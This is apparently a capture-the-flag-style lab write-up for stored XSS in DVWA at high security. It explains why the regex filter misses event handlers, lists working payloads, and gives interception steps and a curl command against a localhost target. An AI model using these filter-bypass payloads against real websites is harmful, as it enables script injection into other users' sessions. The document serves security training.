# DVWA XSS (Stored) — High Security

## URL
http://127.0.0.1:4280/vulnerabilities/xss_s/

## Source Code Behavior (High)
- Message field: `htmlspecialchars()` — fully protected
- Name field: `preg_replace('/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name)` — regex removes script tag patterns
- Same regex as reflected XSS high level

## Key Differences from Medium
1. Name field now uses regex-based script tag removal (case-insensitive)
2. Case bypass and nested bypass no longer work
3. Event handlers on non-script elements still work in Name field

## Working Payloads (Name field only, intercept to bypass maxlength)

### Event handlers
```
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
```

## Step-by-Step Exploitation
1. Message field — fully blocked, skip
2. Intercept POST request to modify Name field (bypass maxlength="10")
3. Set Name to `<img src=x onerror=alert(1)>`
4. Submit — stored XSS fires on page load via event handler

## curl Commands
```bash
# Event handler bypass in name field
curl -X POST "http://127.0.0.1:4280/vulnerabilities/xss_s/" \
  -d "txtName=<img src=x onerror=alert(1)>&mtxMessage=test&btnSign=Sign+Guestbook" \
  -b "PHPSESSID=<session>;security=high"
```

## Notes
- Same principle as reflected high — regex only targets script tags
- Event handlers remain viable attack vector
- Name field maxlength must be bypassed via request interception
